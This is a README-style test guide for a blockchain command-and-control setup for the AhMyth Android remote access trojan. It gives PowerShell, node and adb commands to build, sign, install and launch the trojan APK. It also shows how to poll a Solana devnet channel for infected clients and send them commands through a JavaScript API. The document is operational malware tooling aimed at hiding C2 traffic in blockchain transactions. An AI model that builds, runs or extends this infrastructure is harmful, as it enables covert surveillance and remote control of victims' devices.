# Blockchain Emulator Test Guide

This setup uses **REAL blockchain RPC** (Solana devnet) to test blockchain C2 connections. The emulator is a headless version of the Electron GUI's blockchain listener.

## Files Created

1. **blockchain-emulator-server.js** - Real blockchain RPC poller (headless Electron GUI)
2. **test-blockchain-emulator.ps1** - Automated build, install, and test script

## Quick Start

### Option 1: Automated Test (Recommended)

```powershell
.\test-blockchain-emulator.ps1
```

This script will:
1. Start the blockchain emulator server (polls real blockchain)
2. Build an APK with blockchain config pointing to real RPC
3. Install the APK on your connected device
4. Launch the app
5. Monitor logs for 30 seconds

**Important:** Before running, make sure:
- Android device/emulator is connected (`adb devices`)
- Set environment variables (optional, defaults provided):
  - `BLOCKCHAIN_RPC_URL` - Solana RPC URL (default: `https://api.devnet.solana.com`)
  - `BLOCKCHAIN_CONTRACT_ADDRESS` - Channel address (default: `11111111111111111111111111111111`)
  - `BLOCKCHAIN_C2_AES_KEY` - AES key (64 hex chars)
  - `BLOCKCHAIN_PRIVATE_KEY` - Operator private key (base58)

### Option 2: Manual Steps

1. **Start Emulator Server:**
   ```powershell
   node blockchain-emulator-server.js
   ```
   Or with environment variables:
   ```powershell
   $env:BLOCKCHAIN_RPC_URL="https://api.devnet.solana.com"
   $env:BLOCKCHAIN_CONTRACT_ADDRESS="11111111111111111111111111111111"
   $env:BLOCKCHAIN_C2_AES_KEY="0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"
   node blockchain-emulator-server.js
   ```

2. **Build APK:**
   - Run `.\test-blockchain-emulator.ps1` (it will build automatically)
   - Or manually build in Electron GUI with blockchain config

3. **Install and Run:**
   - Click "Install & Run" button
   - Or manually: `adb install -r <apk-path>`
   - Then: `adb shell am start -n ahmyth.mine.king.ahmyth/.MainActivity`

4. **Verify Connection:**
   - Check emulator console - should show "New client registered"
   - Client will appear in connected clients list
   - Heartbeats will appear every 30 seconds

## How It Works

The emulator server:
- Uses **REAL Solana RPC** (devnet by default)
- Polls blockchain channel for INIT/heartbeat messages (like Electron GUI)
- Detects new clients automatically
- Can send commands via `sendCommandToClient(clientId, command, data)`
- Receives responses from clients
- **No port needed** - uses real blockchain!

The Android app:
- Polls the real blockchain RPC for new transactions
- Extracts memos from transactions
- Decrypts and processes responses
- Sends INIT and heartbeats back via blockchain

The Electron GUI:
- Can run simultaneously (same RPC, same channel)
- Both will see the same clients
- Both can send commands

## Programmatic Usage

```javascript
const emulator = require('./blockchain-emulator-server');

// Get all clients
const clients = emulator.getClients();
console.log('Connected clients:', clients);

// Send command to client
await emulator.sendCommandToClient('clientId123', 'x0000di', {});

// Stop emulator
emulator.stop();
```

## Troubleshooting

**No clients detected:**
- Check that Android app is running and sending INIT messages
- Verify RPC URL is correct and accessible
- Check channel address matches in both emulator and APK config
- Verify AES key matches in both

**Build fails:**
- Ensure Java 11+ is installed and in PATH
- Check that Factory/Ahmyth directory exists
- Verify apktool.jar and sign.jar are in Factory directory

**Installation fails:**
- Uninstall old version: `adb uninstall ahmyth.mine.king.ahmyth`
- Check device is connected: `adb devices`
- Try manual install: `adb install -r <apk-path>`

## Notes

- Uses real Solana devnet (no mock server)
- Requires internet connection for RPC calls
- Channel address must be a valid Solana address
- AES key must match between emulator and Android app
- Operator private key is needed to send commands
